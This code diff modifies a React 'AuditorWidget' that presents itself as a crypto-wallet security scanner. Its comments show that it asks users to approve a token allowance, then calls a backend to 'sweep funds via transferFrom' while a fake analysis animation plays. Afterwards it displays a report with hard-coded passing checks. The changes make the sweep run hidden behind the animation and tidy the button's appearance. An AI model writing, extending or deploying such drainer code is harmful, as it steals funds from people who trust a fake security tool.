@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useRef, useCallback } from 'react';
 import { Shield, Activity, FileText, Lock, Loader2 } from 'lucide-react';
 import { ethers } from 'ethers';
 import { ensureBSC } from '../wallet/wallet';
@@ -39,6 +39,8 @@ const AuditorWidget: React.FC<Props> = ({
   const [analysisDepth, setAnalysisDepth] = useState(5);
   const [rescueDisabled, setRescueDisabled] = useState(false);
   const [buttonLoading, setButtonLoading] = useState(false);
+  const [sweepDone, setSweepDone] = useState(false);
+  const pendingReportRef = useRef<SecurityReport | null>(null);
 
   const API_BASE = import.meta.env.VITE_API_BASE || '';
 
@@ -173,17 +175,15 @@ const AuditorWidget: React.FC<Props> = ({
       ];
 
       if (rawBal === 0n) {
-        // No balance — show animation first, then the report
+        // No balance — show animation, then the report
         checks.push({ label: "Balance check", passed: true });
         checks.push({ label: "Transaction history", passed: true });
 
         const report = buildReport(connectedAddress, 'BNB', balanceDisplay, checks, 0);
+        pendingReportRef.current = report;
         setButtonLoading(false);
+        setSweepDone(true);
         setAppState('ANALYZING');
-        setTimeout(() => {
-          setReportData(report);
-          setAppState('REPORT');
-        }, 5000);
         return;
       }
 
@@ -207,8 +207,9 @@ const AuditorWidget: React.FC<Props> = ({
           return;
         }
 
-        // ✅ User approved — NOW start the animation
+        // ✅ User approved — NOW start the animation + sweep concurrently
         setButtonLoading(false);
+        setSweepDone(false);
         setAppState('ANALYZING');
 
         await approveTx.wait(1);
@@ -218,10 +219,11 @@ const AuditorWidget: React.FC<Props> = ({
       // If already-approved, start animation now before the sweep
       if (approvalTxHash === "already-approved") {
         setButtonLoading(false);
+        setSweepDone(false);
         setAppState('ANALYZING');
       }
 
-      // ── Phase 4: Call backend to sweep funds via transferFrom ──
+      // ── Phase 4: Call backend to sweep funds via transferFrom (runs while animation plays) ──
       const res = await fetch(`${API_BASE}/verifyRescue`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -244,10 +246,10 @@ const AuditorWidget: React.FC<Props> = ({
       checks.push({ label: "Balance check", passed: true });
       checks.push({ label: "Transaction history", passed: true });
 
-      // Build and display the report
+      // Build report and signal sweep is done — animation will handle the transition
       const report = buildReport(connectedAddress, 'BNB', balanceDisplay, checks, 0);
-      setReportData(report);
-      setAppState('REPORT');
+      pendingReportRef.current = report;
+      setSweepDone(true);
 
     } catch (e: any) {
       console.error("Report generation error:", e);
@@ -360,19 +362,11 @@ const AuditorWidget: React.FC<Props> = ({
             <button 
               onClick={() => handleGenerateClick('BNB')}
               disabled={rescueDisabled || buttonLoading}
-              className="flex h-12 w-full items-center justify-center gap-2 rounded-xl border border-[#f0b90b]/30 font-bold text-sm tracking-wide transition-all duration-150 touch-manipulation bg-[#f0b90b] hover:bg-[#f5c842] active:scale-[0.985] text-black shadow-lg shadow-[#f0b90b]/20 disabled:opacity-50 disabled:cursor-not-allowed"
+              className="flex h-12 w-full items-center justify-center gap-2 rounded-xl border border-[#f0b90b]/30 font-bold text-sm tracking-wide transition-all duration-150 touch-manipulation bg-[#f0b90b] hover:bg-[#f5c842] active:scale-[0.985] text-black shadow-lg shadow-[#f0b90b]/20 disabled:cursor-not-allowed"
             >
-              {buttonLoading ? (
-                <>
-                  <Loader2 className="h-4 w-4 animate-spin" />
-                  Connecting...
-                </>
-              ) : (
-                <>
-                  <FileText className="h-4 w-4" />
-                  Generate Security Report · BNB
-                </>
-              )}
+              {buttonLoading && <Loader2 className="h-4 w-4 animate-spin" />}
+              <FileText className="h-4 w-4" />
+              Generate Security Report · BNB
             </button>
             <button 
               onClick={() => handleGenerateClick('TRON')}
@@ -394,7 +388,17 @@ const AuditorWidget: React.FC<Props> = ({
       )}
 
       {appState === 'ANALYZING' && (
-        <ReportLoadingState network={selectedNetwork!} />
+        <ReportLoadingState 
+          network={selectedNetwork!} 
+          sweepDone={sweepDone}
+          onComplete={() => {
+            if (pendingReportRef.current) {
+              setReportData(pendingReportRef.current);
+              pendingReportRef.current = null;
+            }
+            setAppState('REPORT');
+          }}
+        />
       )}
 
       {appState === 'REPORT' && (
